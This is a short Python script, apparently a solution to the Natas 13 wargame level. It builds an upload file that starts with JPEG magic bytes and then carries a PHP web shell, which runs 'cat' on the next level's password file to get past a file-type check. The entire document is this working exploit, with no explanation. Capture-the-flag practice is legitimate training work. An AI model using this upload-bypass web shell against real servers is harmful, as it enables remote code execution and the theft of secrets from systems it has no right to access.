magic_bytes = b"\xFF\xD8\xFF\xE0"
php_shell = b"""
<?php echo exec("cat /etc/natas_webpass/natas14"); ?>
"""
fh = open('natas13getaccess.php','wb')
fh.write(magic_bytes + php_shell)
fh.close()
